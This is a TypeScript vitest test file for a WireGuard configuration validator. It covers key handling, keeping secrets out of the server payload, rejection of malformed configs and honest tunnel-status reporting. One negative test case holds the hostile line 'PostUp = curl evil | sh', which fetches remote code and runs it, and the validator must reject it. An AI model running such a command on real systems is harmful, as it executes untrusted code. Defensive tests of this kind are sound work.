import { describe, it, expect } from 'vitest';
import { generateKeyPairSync } from 'node:crypto';
import { parseAndValidate, toServerPayload, tunnelStatus, isPlausibleKey, isCidr } from './wireguard';

// Real X25519 keys generated per test run; nothing hard-coded.
function x25519() {
  const { publicKey, privateKey } = generateKeyPairSync('x25519');
  const raw = (k: typeof publicKey, type: 'spki' | 'pkcs8') => (k.export({ format: 'der', type }) as Buffer).subarray(-32).toString('base64');
  return { pub: raw(publicKey, 'spki'), priv: raw(privateKey, 'pkcs8') };
}
const me = x25519(), peer = x25519();
const good = `[Interface]
PrivateKey = ${me.priv}
Address = 10.8.0.2/32, fd00::2/128
DNS = 1.1.1.1
[Peer]
PublicKey = ${peer.pub}
Endpoint = vpn.example.org:51820
AllowedIPs = 0.0.0.0/0, ::/0
PersistentKeepalive = 25
`;

describe('WireGuard validator', () => {
  it('accepts a valid config with real keys', () => {
    const r = parseAndValidate(good);
    expect(r.errors).toEqual([]);
    expect(r.config?.peers[0]?.endpoint).toBe('vpn.example.org:51820');
  });

  it('server payload never contains private or preshared key material', () => {
    const psk = x25519().priv;
    const r = parseAndValidate(good.replace('PersistentKeepalive = 25', `PresharedKey = ${psk}`));
    const json = JSON.stringify(toServerPayload(r.config!));
    expect(json).not.toContain(me.priv);
    expect(json).not.toContain(psk);
    expect(json).not.toMatch(/private|preshared/i);
  });

  it.each([
    ['all-zero placeholder key', good.replace(me.priv, 'A'.repeat(43) + '=')],
    ['short key', good.replace(me.priv, 'abc=')],
    ['bad CIDR', good.replace('10.8.0.2/32', '10.8.0.300/32')],
    ['bad port', good.replace(':51820', ':70000')],
    ['missing peer', good.split('[Peer]')[0]!],
    ['unknown key', good.replace('DNS = 1.1.1.1', 'PostUp = curl evil | sh')],
    ['peer key equals private key', good.replace(peer.pub, me.priv)],
    ['two interfaces', good + `[Interface]\nPrivateKey = ${me.priv}\n`],
  ])('rejects %s', (_n, text) => {
    expect(parseAndValidate(text).ok).toBe(false);
  });

  it('key/CIDR helpers', () => {
    expect(isPlausibleKey(me.pub)).toBe(true);
    expect(isPlausibleKey('/'.repeat(43) + '=')).toBe(false);
    expect(isCidr('::/0')).toBe(true);
    expect(isCidr('10.0.0.0/33')).toBe(false);
  });
});

describe('tunnel status is never fabricated', () => {
  const now = 1_800_000_000;
  it('UNKNOWN without a measured handshake', () => {
    expect(tunnelStatus(undefined, now)).toBe('UNKNOWN');
    expect(tunnelStatus(null, now)).toBe('UNKNOWN');
    expect(tunnelStatus(Number.NaN, now)).toBe('UNKNOWN');
    expect(tunnelStatus(now + 3600, now)).toBe('UNKNOWN');
  });
  it('NO_HANDSHAKE when backend reports 0', () => expect(tunnelStatus(0, now)).toBe('NO_HANDSHAKE'));
  it('CONNECTED only with a recent handshake', () => {
    expect(tunnelStatus(now - 30, now)).toBe('CONNECTED');
    expect(tunnelStatus(now - 181, now)).toBe('STALE_HANDSHAKE');
  });
});
